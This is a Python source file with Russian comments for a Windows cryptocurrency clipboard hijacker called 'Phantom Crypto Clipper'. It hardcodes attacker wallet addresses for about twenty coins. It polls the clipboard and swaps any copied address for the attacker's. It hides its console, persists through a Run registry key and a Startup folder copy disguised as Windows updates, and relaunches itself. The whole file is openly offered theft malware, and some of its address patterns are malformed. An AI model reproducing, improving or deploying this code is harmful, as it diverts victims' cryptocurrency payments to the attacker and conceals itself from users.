#!/usr/bin/env python3
# phantom_crypto.py - ФИНАЛЬНЫЙ КРИПТО КЛИППЕР ДЛЯ ЗАГРУЗКИ

import os
import sys
import ctypes
import threading
import time
import re
import hashlib
import base64
import subprocess
import winreg
import random
import string

# =================== ТВОИ КОШЕЛЬКИ ===================

WALLETS = {
    'btc': 'bc1q6rl9yt6sphu35r2hnjl9hwyuzunymt62zjh0jl',  # <-- ТВОЙ BTC АДРЕС
    'eth': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',  # <-- ТВОЙ ETH АДРЕС
    'xrp': 'rnXaahAyXUL84G3FJZQqeGsuWH1aPDppdY',  # <-- ТВОЙ XRP АДРЕС
    'trx': 'TGWJae3A6coKoJ7mfEL2zoJmEtNZrtMFef',  # <-- ТВОЙ TRX АДРЕС
    'ton': 'UQB5fCRohpbbAKd-zSmbKcuLXKlyHaoRPLvDVhWJNAbXAg4A',  # <-- ТВОЙ TON АДРЕС
    'ltc': 'ltc1qv9zzt6u3u3ujxl4fh5gedfhe3m4d2xqmh95fv3',  # <-- ТВОЙ LTC АДРЕС
    'usdt_erc': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',  # <-- ТВОЙ USDT ERC-20 АДРЕС
    'sol': 'AqUuX2ozrWqDEAmotVaqkyDtTNEt3DwmsEL6xBPzbTjz',  # <-- ТВОЙ SOL АДРЕС
    'doge': 'DBrR4MYkFawin6JgQ5rVRLGYMSYxXnsZkE',  # <-- ТВОЙ DOGE АДРЕС
    'bch': 'qrln7fac422h8jvq9lahdsc439p595rx0uj48e6g0l',  # <-- ТВОЙ BCH АДРЕС
    'xlm': 'GBZXAPJDDYXUTRMXUX7KJZIK3ERFHCMUC3TBXH4A2OVQMY37DNB4M7HS',  # <-- ТВОЙ XLM АДРЕС
    'ada': 'addr1qyu6jfljltj75ha0r0pp2t3ax2ljuv50m9e4k08wgeqme20tkwwg2cl3wzpdp9ewfmlgaj9gj9delqe54lcjn84pjgcqay3ajt',  # <-- ТВОЙ ADA АДРЕС
    'polygon': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',  # <-- ТВОЙ POLYGON АДРЕС
    'dot': '1QFDFxZUUoqQe168rnf8idrKB1sVGBLuQoUFWxBwsQrsuyH',  # <-- ТВОЙ DOT АДРЕС
    'dash': 'XjjLykfR1EDojRTNnt3VSPjuqatdeQy2nA',  # <-- ТВОЙ DASH АДРЕС
    'bnb': '0x5972549f0880C7C45F353FdCB0CD42688582c5fc',  # <-- ТВОЙ BNB АДРЕС
    'xtz': 'tz1SZs2awPWaEeBjB2Lf8EgSfATWtjjbNuSa',  # <-- ТВОЙ XTZ АДРЕС
    'zec': 't1XheRP6Gn6BLrcCDbtFJn94iGAdTLFAGCj',  # <-- ТВОЙ ZEC АДРЕС
    'usdt_trc': 'TGWJae3A6coKoJ7mfEL2zoJmEtNZrtMFef'  # <-- ТВОЙ USDT TRC-20 АДРЕС
}

# =================== ПАТТЕРНЫ ДЕТЕРКЦИИ ===================

PATTERNS = {
    'btc': [
        r'^1[1-9A-HJ-NP-Za-km-z]{25,34}$',      # Legacy
        r'^3[1-9A-HJ-NP-Za-km-z]{25,34}$',      # SegWit
        r'^bc1[ac-hj-np-z02-9]{11,71}$'          # Bech32
    ],
    'eth': [
        r'^0x[a-fA-F0-9]{40}$'                   # ETH и все EVM
    ],
    'xrp': [
        r'^r[1-9A-HJ-NP-Za-km-z]{25,34}$'        # Ripple
    ],
    'trx': [
        r'^T[A-Za-z1-9]{33}$'                    # Tron
    ],
    'ton': [
        r'^UQ[A-Za-z0-9_-]{48}$',               # TON bounceable
        r'^EQ[A-Za-z0-9_-]{48}$'                # TON non-bounceable
    ],
    'ltc': [
        r'^L[1-9A-HJ-NP-Za-km-z]{25,34}$',      # Litecoin legacy
        r'^3[1-9A-HJ-NP-Za-km-z]{25,34}$',      # Litecoin SegWit
        r'^ltc1[ac-hj-np-z02-9]{11,71}$'          # Litecoin Bech32
    ],
    'usdt_erc': [
        r'^0x[a-fA-F0-9]{40}$'                   # USDT ERC-20
    ],
    'sol': [
        r'^[1-9A-HJ-NP-Za-km-z]{88,44}$'          # Solana
    ],
    'doge': [
        r'^D[1-9A-HJ-NP-Za-km-z]{25,34}$'        # Dogecoin
    ],
    'bch': [
        r'^qr[a-zA-Z0-9]{7,100}$',               # CashAddr
        r'^1[1-9A-HJ-NP-Za-km-z]{25,34}$',        # BCH legacy
        r'^3[1-9A-HJ-NP-Za-km-z]{25,34}$'         # BCH SegWit
    ],
    'xlm': [
        r'^G[A-Z0-9]{55}$'                      # Stellar
    ],
    'ada': [
        r'^addr1[a-z0-9]{58,98}$'              # Cardano
    ],
    'polygon': [
        r'^0x[a-fA-F0-9]{40}$'                   # Polygon (MATIC)
    ],
    'dot': [
        r'^1[1-9A-HJ-NP-Za-km-z]{46,48}$'        # Polkadot
    ],
    'dash': [
        r'^X[1-9A-HJ-NP-Za-km-z]{25,34}$'        # Dash
    ],
    'bnb': [
        r'^0x[a-fA-F0-9]{40}$'                   # BNB Smart Chain
    ],
    'xtz': [
        r'^tz[1-3][A-Za-z0-9]{33}$'              # Tezos
    ],
    'zec': [
        r'^t[1-3][A-Za-z0-9]{33}$'              # Zcash
    ],
    'usdt_trc': [
        r'^T[A-Za-z1-9]{33}$'                    # USDT TRC-20
    ]
}

# =================== ОСНОВНОЙ КРИПТО КЛИППЕР ===================

class PhantomCryptoClipper:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.user32 = ctypes.windll.user32
        self.stats = {
            'replaced': 0,
            'networks': {},
            'start_time': time.time()
        }
        
    def replace_crypto_addresses(self, content):
        """Заменяет ВСЕ крипто адреса на твои"""
        original_content = content
        replaced_any = False
        
        for network, patterns in PATTERNS.items():
            for pattern in patterns:
                # Ищем совпадения
                matches = re.findall(pattern, content, re.IGNORECASE)
                
                for match in matches:
                    if match != WALLETS[network]:  # Не заменяем свой же адрес
                        # Заменяем на твой адрес
                        content = content.replace(match, WALLETS[network])
                        
                        # Статистика
                        self.stats['replaced'] += 1
                        if network not in self.stats['networks']:
                            self.stats['networks'][network] = 0
                        self.stats['networks'][network] += 1
                        
                        # Логирование (скрыто)
                        print(f"[💰] {network.upper()} replaced: {match[:12]}... -> {WALLETS[network][:12]}...")
                        
                        replaced_any = True
        
        return content, replaced_any
    
    def monitor_clipboard(self):
        """Мониторит буфер обмена и заменяет адреса"""
        last_clipboard = ""
        
        print("[*] Phantom Crypto Clipper started!")
        print(f"[+] Monitoring {len(WALLETS)} crypto networks...")
        
        while True:
            try:
                # Открываем буфер обмена
                if self.user32.OpenClipboard(0):
                    handle = self.user32.GetClipboardData(1)  # CF_TEXT
                    
                    if handle:
                        data = ctypes.c_char_p(handle).value
                        
                        if data and data != last_clipboard:
                            content = data.decode('utf-8', errors='ignore')
                            
                            # Проверяем и заменяем крипто адреса
                            new_content, replaced = self.replace_crypto_addresses(content)
                            
                            if replaced:
                                # Обновляем буфер обмена
                                self.user32.EmptyClipboard()
                                self.user32.SetClipboardData(1, new_content.encode('utf-8'))
                                
                                # Выводим статистику
                                print(f"[🎯] TOTAL REPLACED: {self.stats['replaced']}")
                                print(f"[📊] By network: {self.stats['networks']}")
                            
                            last_clipboard = data
                    
                    # Закрываем буфер обмена
                    self.user32.CloseClipboard()
                    
            except Exception as e:
                # Игнорируем ошибки доступа к буферу обмена
                pass
                
            # Небольшая задержка для экономии ресурсов
            time.sleep(0.1)

# =================== ПЕРСИСТЕНТНОСТЬ И АВТОЗАПУСК ===================

def setup_persistence():
    """Устанавливает персистентность в системе"""
    try:
        # Получаем путь к текущему скрипту
        if getattr(sys, 'frozen', False):
            # Если запущено как EXE
            script_path = sys.executable
        else:
            # Если запущено как скрипт
            script_path = os.path.abspath(__file__)
        
        # Метод 1: Registry autorun
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            print("[+] Registry persistence established")
        except:
            print("[-] Failed to set registry persistence")
        
        # Метод 2: Startup folder
        try:
            startup_path = os.path.join(
                os.environ['APPDATA'],
                'Microsoft',
                'Windows',
                'Start Menu',
                'Programs',
                'Startup',
                'WindowsUpdate.exe'
            )
            
            if not os.path.exists(startup_path):
                # Копируем себя в автозагрузку
                import shutil
                shutil.copy2(script_path, startup_path)
                print("[+] Startup folder persistence established")
        except:
            print("[-] Failed to set startup persistence")
            
    except Exception as e:
        print(f"[-] Persistence setup error: {e}")

def hide_console():
    """Скрывает консольное окно"""
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
    except:
        pass

# =================== ОСНОВНАЯ ФУНКЦИЯ ===================

def main():
    """Главная функция - точка входа"""
    
    # Скрываем консоль
    hide_console()
    
    # Установка персистентности (только при первом запуске)
    if len(sys.argv) == 1:  # Нет аргументов = первый запуск
        print("[*] First run - setting up persistence...")
        setup_persistence()
        
        # Перезапускаем себя в скрытом режиме
        try:
            if getattr(sys, 'frozen', False):
                # EXE версия
                subprocess.Popen(
                    [sys.executable, "--persistent"],
                    creationflags=subprocess.CREATE_NEW_CONSOLE,
                    shell=True,
                    close_fds=True
                )
            else:
                # Python версия
                subprocess.Popen(
                    [sys.executable, __file__, "--persistent"],
                    creationflags=subprocess.CREATE_NEW_CONSOLE,
                    shell=True,
                    close_fds=True
                )
        except:
            pass
        
        return
    
    # Основной режим работы
    print("[*] Phantom Crypto Clipper starting in persistent mode...")
    
    # Создаем и запускаем клиппер
    clipper = PhantomCryptoClipper()
    
    try:
        clipper.monitor_clipboard()
    except KeyboardInterrupt:
        print("[*] Clipper stopped")
    except Exception as e:
        print(f"[*] Error: {e}")

# =================== ЗАПУСК ===================

if __name__ == "__main__":
    main()